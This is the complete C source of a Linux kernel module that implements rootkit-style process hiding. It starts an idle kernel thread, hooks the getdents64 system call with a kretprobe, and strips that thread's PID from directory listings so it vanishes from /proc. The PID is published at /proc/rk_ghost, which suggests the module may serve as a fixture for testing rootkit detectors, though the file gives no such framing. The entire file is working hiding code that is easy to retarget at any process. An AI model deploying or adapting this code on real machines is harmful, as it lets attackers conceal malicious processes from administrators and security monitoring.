// SPDX-License-Identifier: GPL-2.0
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

static struct proc_dir_entry *proc_entry;
static struct task_struct *ghost_thread;
static char ghost_pid_str[16];

struct getdents_ctx {
	struct linux_dirent64 __user *dirent;
};

static int ghost_loop(void *data)
{
	while (!kthread_should_stop())
		schedule_timeout_interruptible(HZ);
	return 0;
}

static int entry_getdents64(struct kretprobe_instance *ri,
			    struct pt_regs *regs)
{
	struct getdents_ctx *ctx = (void *)ri->data;
	struct pt_regs *uregs = (struct pt_regs *)regs->di;

	ctx->dirent = (struct linux_dirent64 __user *)uregs->si;
	return 0;
}

static int ret_getdents64(struct kretprobe_instance *ri,
			  struct pt_regs *regs)
{
	struct getdents_ctx *ctx = (void *)ri->data;
	long ret = regs_return_value(regs);
	struct linux_dirent64 *cur;
	char *buf;
	long off;

	if (ret <= 0)
		return 0;

	buf = kmalloc(ret, GFP_ATOMIC);
	if (!buf)
		return 0;

	if (copy_from_user_nofault(buf, ctx->dirent, ret)) {
		kfree(buf);
		return 0;
	}

	off = 0;
	while (off < ret) {
		cur = (struct linux_dirent64 *)(buf + off);
		if (strcmp(cur->d_name, ghost_pid_str) == 0) {
			long rest = ret - off - cur->d_reclen;

			if (rest > 0)
				memmove(buf + off,
					buf + off + cur->d_reclen, rest);
			ret -= cur->d_reclen;
			continue;
		}
		off += cur->d_reclen;
	}

	if (copy_to_user_nofault(ctx->dirent, buf, ret))
		regs_set_return_value(regs, -EFAULT);
	else
		regs_set_return_value(regs, ret);
	kfree(buf);
	return 0;
}

static struct kretprobe krp = {
	.kp.symbol_name	= "__x64_sys_getdents64",
	.entry_handler	= entry_getdents64,
	.handler	= ret_getdents64,
	.data_size	= sizeof(struct getdents_ctx),
	.maxactive	= 20,
};

static int ghost_pid_show(struct seq_file *m, void *v)
{
	seq_printf(m, "%d\n", ghost_thread->pid);
	return 0;
}

static int __init pidhider_init(void)
{
	int err;

	ghost_thread = kthread_create(ghost_loop, NULL, "khidden");
	if (IS_ERR(ghost_thread))
		return PTR_ERR(ghost_thread);

	wake_up_process(ghost_thread);
	snprintf(ghost_pid_str, sizeof(ghost_pid_str), "%d",
		 ghost_thread->pid);

	err = register_kretprobe(&krp);
	if (err) {
		kthread_stop(ghost_thread);
		return err;
	}

	proc_entry = proc_create_single("rk_ghost", 0444, NULL,
					ghost_pid_show);
	if (!proc_entry) {
		unregister_kretprobe(&krp);
		kthread_stop(ghost_thread);
		return -ENOMEM;
	}

	pr_info("rk: process hiding active, PID %d hidden\n",
		ghost_thread->pid);
	return 0;
}

static void __exit pidhider_exit(void)
{
	proc_remove(proc_entry);
	unregister_kretprobe(&krp);
	kthread_stop(ghost_thread);
}

module_init(pidhider_init);
module_exit(pidhider_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Process visibility control via getdents64");
